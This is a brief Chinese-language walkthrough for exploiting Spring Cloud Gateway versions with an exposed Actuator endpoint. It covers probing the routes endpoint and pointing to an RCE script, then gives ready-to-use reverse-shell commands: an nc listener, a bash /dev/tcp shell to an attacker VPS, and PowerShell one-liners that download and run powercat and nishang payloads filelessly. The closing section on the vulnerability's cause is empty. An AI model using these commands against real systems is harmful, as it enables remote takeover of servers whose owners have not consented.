# SpringCloudGateway 漏洞利用

## 利用条件：

- Spring Cloud Gateway 启用和暴露 Gateway Actuator 端点
- Spring Cloud Gateway < 3.1.1
- Spring Cloud Gateway < 3.0.7

## 利用方法：

#### 步骤一：

` http://ip:端口/actuator/gateway/routes `

访问页面，可以看到路由配置信息。

#### 步骤二：

使用[脚本](url地址)执行RCE命令

![](img_url)

#### 步骤三：
	
反弹shell

vps开启nc监听：
```base
nc -lvp 2333
```
目标机器cmd执行：
linux：
```base
bash -i >& /dev/tcp/vpsIP/2333 0>&1
```
windows：

powercat反弹：
```base
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 2333 -e cmd
```
TCP流量，远程下载无文件落地执行：
```base
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress vpsIP -port 2333
```
Udp流量,远程下载无文件落地执行
```base
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp  -Reverse  -IPAddress  vpsIP -port 2333
```

## 漏洞原理：